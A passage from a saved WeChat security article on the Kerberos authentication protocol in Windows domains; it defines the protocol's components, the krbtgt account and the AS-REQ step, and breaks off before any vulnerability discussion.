<html>
<head>
<title>干货全网最详细的Kerberos协议及其漏洞</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | 全网最详细的Kerberos协议及其漏洞
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    11ccaab
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-07-07</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062235828229#wechat_redirect" data-tag_id="" data-album_id="1928066062235828229"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>Kerberos协议</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>4</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066061682180099#wechat_redirect" data-tag_id="" data-album_id="1928066061682180099"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>基础知识</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>4</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062302937090#wechat_redirect" data-tag_id="" data-album_id="1928066062302937090"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>内网渗透</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>20</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><section style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal;padding-right: 8px;padding-left: 8px; " data-mpa-powered-by="yiban.io"><table><thead style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;background: rgba(0, 0, 0, 0.05);font-weight: bold;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">DC</td><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="511.6666666666667">域控</td></tr></thead><tbody style="-webkit-tap-highlight-color: transparent;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">KDC</td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="504.6666666666667">密钥分发中心，由域控担任</td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">AD</td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="295">活动目录，里面包含域内用户数据库</td></tr></tbody></table></section><section style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal;padding-right: 8px;padding-left: 8px; "><table><thead style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;background: rgba(0, 0, 0, 0.05);font-weight: bold;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">AS</td><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="335">Kerberos认证服务</td></tr></thead><tbody style="-webkit-tap-highlight-color: transparent;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">TGT</td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="498.6666666666667">TGT认证权证，由AS服务发放</td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">TGS</td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="335">票据授予服务</td></tr></tbody></table></section><section style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal;padding-right: 8px;padding-left: 8px; "><table><thead style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;background: rgba(0, 0, 0, 0.05);font-weight: bold;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">ST</td><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;">ST服务票据，由TGS服务发送</td><td style="-webkit-tap-highlight-color: transparent;line-height: 1.75;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="308.6666666666667"><br  /></td></tr></thead><tbody style="-webkit-tap-highlight-color: transparent;"><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;"><br  /></td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;"><br  /></td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="302.6666666666667"><br  /></td></tr><tr style="-webkit-tap-highlight-color: transparent;"><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;"><br  /></td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;"><br  /></td><td style="-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-color: rgb(223, 223, 223);padding: 0.25em 0.5em;" width="308.6666666666667"><br  /></td></tr></tbody></table></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><strong style="letter-spacing: 0.1em;-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">krbtgt</strong><span style="letter-spacing: 0.1em;">&nbsp;用户，该用户是在创建域时系统自动创建的一个账号，其作用是密钥发行中心的服务账号，其密码是系统随机生成的，无法正常登陆主机。</span><strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;"></strong></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.82847533632287" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/1_3aXibBSZjsjvdn4Pk4H8gwsAQro29w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIPEh1geFjtEKSkDAahxw6hNLUC3aXibBSZjsjvdn4Pk4H8gwsAQro29w/640?wx_fmt=png'" data-type="png" data-w="892" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">域控(server08):192.168.3.142</span><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /><span style=" color: rgb(0, 0, 0); text-align: start; ">server08：192.168.3.68</span><br style=" -webkit-tap-highlight-color: transparent;color: rgb(0, 0, 0); text-align: start;white-space: normal; "  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">AS-REQ</h1><blockquote style="margin: 2em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgba(0, 0, 0, 0.5);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-left: none;padding: 1em;border-radius: 8px;background: rgb(247, 247, 247);"><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font-size: 1em;letter-spacing: 0.1em;">客户端向KDC的AS认证服务请求TGT认证权证。TGT是KDC的AS认证服务发放的</p></blockquote><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;"><br  /></p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">1、<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">AS-REQ</strong>：当域内某个用户试图访问域中的某个服务，于是输入用户名和密码，本机的Kerberos服务会向KDC的AS认证服务发送一个AS-REQ认证请求。该请求包中包含：&nbsp;<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">请求的用户名</strong>、<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">客户端主机名、加密类型</strong>&nbsp;和&nbsp;<strong style="-webkit-tap-highlight-color: transparent;color: rgb(15, 76, 129);line-height: 1.75;">Authenticator(用户NTLM Hash加密的时间戳</strong>)**&nbsp;&nbsp;**以及一些其他信息。<br style="-webkit-tap-highlight-color: transparent;"  /></p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.10048622366288493" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/2_N07n645ojSicWTOCoEjtzU5eM4UwNA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfSlqBP1IISmWdJIrPsTshA30CN07n645ojSicWTOCoEjtzU5eM4UwNA/640?wx_fmt=png'" data-type="png" data-w="617" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4971153846153846" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/3_SwDlSdTdhrDm8yjPRsRQN0gVWiaS1g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIVvrN8Jp8kDbTnvYzchzzkocBeSwDlSdTdhrDm8yjPRsRQN0gVWiaS1g/640?wx_fmt=png'" data-type="png" data-w="1040" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.45538818076477405" src="图片/HACK学习呀_2021-07-07_干货全网最详细的Kerberos协议及其漏洞/4_N0rEoQibI79ZQN2uHrGOd7XUPEodAw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUfSW9cTsyKPqnXbngDz7HcEUkN0rEoQibI79ZQN2uHrGOd7XUPEodAw/640?wx_fmt=png'" data-type="png" data-w="863" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;height: auto !important;" title="null"  /></figure><p style="margin: 1.5em 